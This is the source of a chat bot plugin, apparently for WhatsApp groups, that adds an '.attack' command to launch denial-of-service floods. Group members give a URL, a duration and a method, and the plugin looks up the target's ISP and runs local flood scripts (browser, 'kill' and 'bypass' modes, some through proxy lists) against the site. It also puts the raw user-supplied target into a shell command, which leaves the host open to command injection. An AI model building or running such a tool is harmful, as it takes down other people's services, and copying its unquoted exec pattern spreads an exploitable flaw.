const fetch = require('node-fetch');
const axios = require('axios');
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url');

let globalCooldown = null; // Global cooldown variable to track ongoing attacks

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\`[🔎] .attack [url] [duration] [methods]\`\`\`', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  }

  const target = args[0];
  let duration = parseInt(args[1]);
  const methods = args[2];
  const maxDuration = 60; // Maximum duration limit (in seconds)

  if (duration > maxDuration) {
    return conn.reply(m.chat, `❌ Durasi terlalu lama, batas maksimal adalah ${maxDuration} detik.`, m);
  }

  const parsedUrl = new url.URL(target);
  const hostname = parsedUrl.hostname;
  const path = parsedUrl.pathname;
  const thumb = global.attacking;
  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);

  const result = response.data;

  const deepinfo = `Isp: ${result.isp} 
\`Ip:\` ${result.query}
\`AS:\` ${result.as}  
\`Running Free Attack: 1/1\`
➖➖➖➖➖➖➖➖➖➖➖
\`Attack Powwerd by: ( @Demon_Service )\``

  const details = `*Attack Successfully✅*  
  
\`Target:\` ${target}  
\`Methods:\` ${methods} 
\`Duration:\` ${duration} 
${deepinfo}`;

  // Check if a global cooldown is in place
  if (globalCooldown) {
    const remainingTime = globalCooldown - Date.now();
    if (remainingTime > 0) {
      return conn.reply(m.chat, `❌ Harap tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum melakukan serangan lagi.`, m);
    }
  }

  // Set global cooldown
  globalCooldown = Date.now() + duration * 1000;

  if (methods === 'browsers') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXBrowsers.js ${target} ${duration} 100 10`)
  } else if (methods === 'kill') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXKill.js ${target} ${duration} 100 10 proxy.txt`)
} else if (methods === 'bypass') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXBypass.js ${target} ${duration} 100 10 proxy.txt`)
}  else {
    m.reply(`_*Unknown Methods*_`);
  }

  // Clear the global cooldown after the duration
  setTimeout(() => {
    globalCooldown = null;
  }, duration * 1000);
};

handler.help = ['attack'].map(v => v + ' <url> <duration>');
handler.tags = ['tools', 'attack'];
handler.premium = false;
handler.group = true;
handler.command = /^(attack)$/i;

module.exports = handler;